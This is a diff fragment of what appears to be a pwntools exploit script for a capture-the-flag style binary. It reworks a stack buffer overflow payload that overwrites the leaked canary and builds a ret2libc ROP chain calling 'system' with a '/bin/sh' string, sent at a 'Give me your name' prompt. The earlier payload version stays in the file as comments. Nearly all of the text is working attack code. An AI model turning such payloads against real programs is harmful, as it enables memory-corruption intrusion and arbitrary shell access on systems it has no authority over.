@@ -104,20 +104,31 @@ admingad = libc.address + 0x000000000010f28c
 payload = b'a'*128
 payload += p64(canary)
 payload += b'b'*8
-payload += p64(admingad)
-payload += b'e'*80
-payload += p64(canary) 
-payload += p64(canary) 
-payload += b'c'*120
+payload += p64(gad1)
+payload += b'c'*0x58
+payload += p64(canary)
 payload += b'd'*8
 payload += p64(binsh)
-payload += p64(0)
-payload += p64(0)
-payload += p64(21)
-payload += p64(22)
-payload += p64(23)
-payload += p64(24)
 payload += p64(system)
+payload += p64(gad2)
+
+# payload = b'a'*128
+# payload += p64(canary)
+# payload += b'b'*8
+# payload += p64(admingad)
+# payload += b'e'*80
+# payload += p64(canary) 
+# payload += p64(canary) 
+# payload += b'c'*120
+# payload += b'd'*8
+# payload += p64(binsh)
+# payload += p64(0)
+# payload += p64(0)
+# payload += p64(21)
+# payload += p64(22)
+# payload += p64(23)
+# payload += p64(24)
+# payload += p64(system)
 
 sla(b"Give me your name: ", payload)
 
